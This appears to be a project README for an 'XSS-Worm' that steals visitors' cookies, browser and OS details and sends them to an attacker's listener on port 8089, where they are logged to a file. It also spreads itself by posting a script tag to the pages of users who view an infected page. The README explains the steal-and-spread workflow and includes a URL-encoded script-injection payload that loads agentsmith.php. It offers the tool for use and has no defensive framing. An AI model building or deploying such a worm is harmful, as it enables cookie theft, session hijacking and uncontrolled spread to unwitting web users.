# XSS-Worm
XSS Worm which steals cookies and some information of victim's, also spreads others. Written in js, php and java.

## Stealing
The worm will send cookies and some other information (like browser and os) to the attacker (attacker presented as localhost in the script).
1. The script inside **javascript/worm.js** need to be embedded into attackers webpage somehow.
2. Attacker will listen a port (8089 in this case) to receive stealed data sent from worm. And incoming data will be printed to a text file (named "cookies.txt"). Here the **tcp/Main.java** program will do the trick.
3. Finally, attacker can display stealed information with **web/innocentwebapp.php** file which parses "cookies.txt" file. Stealed information will be seperated by "#" character in script. when parsing, it will be delimited by "#".
```php
$row_data = explode('#', $data);
```

## Spreading
The worm (**javascript/worm.js**) will spread(post) itself to anyone's webpage who *involuntarily* run itself.
1. Worm has a part which sends a request to **web/agentsmith.php** and post its response to the webpage whom visits the contagious page.(To make the request properly, data must be URL encoded.)
```javascript
var agentsmith = "%3Cscript%20type%3D%5C%22text%2Fjavascript%5C%22%20src%3D%5C%22http%3A%2F%2Flocalhost%2Fagentsmith.php%5C%22%3E%3C%2Fscript%3E";
```

2. If the worm posted succefully to victims webpage, who visits the victims contagious page will be also exploited.
